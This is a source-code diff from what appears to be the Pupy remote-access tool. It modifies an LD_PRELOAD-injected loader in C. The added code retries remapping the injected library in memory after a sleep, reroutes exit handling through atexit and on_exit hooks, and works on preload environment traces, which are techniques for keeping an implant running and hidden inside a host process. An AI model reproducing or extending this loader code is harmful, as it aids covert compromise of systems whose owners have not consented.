@@ -15,9 +15,39 @@ static pthread_t thread_id;
 static int __argc = 0;
 static char ** __argv = NULL;
 static int __to_wait = 0;
+static int __unmapped = -1;
 
 static void *
 thread_start(void *arg) {
+    /*
+     * We start from unstable state, no way to know
+     * when libraries were fully loaded. While horribly racy,
+     * sleep is better then nothing.
+     */
+
+    sleep(1);
+
+#ifdef Linux
+    /*
+     * Remap may be possible only after library load,
+     */
+
+    if (__unmapped != 0) {
+        dprint("Try to remap again\n");
+
+        struct link_map *link_map = NULL;
+        void *self = dlopen(0, RTLD_LAZY);
+        dprint("SELF: %p\n", self);
+
+        if (self && dlinfo(self, RTLD_DI_LINKMAP, &link_map) == 0) {
+            dprint("Library path: '%s'\n", link_map->l_name);
+            if (link_map->l_name) {
+                __unmapped = remap(link_map->l_name);
+            }
+        }
+    }
+#endif
+
     mainThread(__argc, __argv, true);
     return NULL;
 }
@@ -29,7 +59,8 @@ void unloader(void) {
     dprint("Sutting down\n");
 }
 
-void _exit(int status) {
+static
+void __handle_exit(int status) {
     dprint("Catch exit (%d)\n", __to_wait);
     __attribute__((noreturn))
         void (*orig_exit)(int status) = dlsym(RTLD_NEXT, "_exit");
@@ -45,13 +76,13 @@ void _exit(int status) {
 static
 void __atexit() {
     dprint("At exit\n");
-    _exit(0);
+    __handle_exit(0);
 }
 
 static
 void __on_exit(int status, void *data) {
     dprint("On exit\n");
-    _exit(status);
+    __handle_exit(status);
 }
 
 static void _pupy_main(int argc, char* argv[], char* envp[]) {
@@ -75,7 +106,7 @@ static void _pupy_main(int argc, char* argv[], char* envp[]) {
 
     if (ldpreload) {
         dprint("REMAP SELF\n0");
-        remap(ldpreload);
+        __unmapped = remap(ldpreload);
     }
 
     if (cleanup && ldpreload && !strcmp(cleanup, "1")) {
@@ -89,7 +120,10 @@ static void _pupy_main(int argc, char* argv[], char* envp[]) {
     }
 
     atexit(__atexit);
+
+#ifdef Linux
     on_exit(__on_exit, NULL);
+#endif
 
     while (*envp) {
         if ((strncmp(*envp, "LD_PRELOAD=", 11) == 0)
